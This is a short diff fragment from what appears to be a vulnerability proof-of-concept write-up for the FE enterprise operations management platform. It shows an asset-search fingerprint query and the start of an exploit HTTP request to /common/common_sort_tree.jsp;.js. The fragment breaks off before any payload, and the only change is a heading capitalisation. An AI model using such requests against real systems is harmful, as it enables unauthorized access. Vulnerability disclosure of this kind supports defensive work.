@@ -5,7 +5,7 @@
 app="飞企互联-FE企业运营管理平台"
 ```
 
-## poc
+## POC
 ```
 POST /common/common_sort_tree.jsp;.js HTTP/1.1
 Host: xx.xx.xx.xx
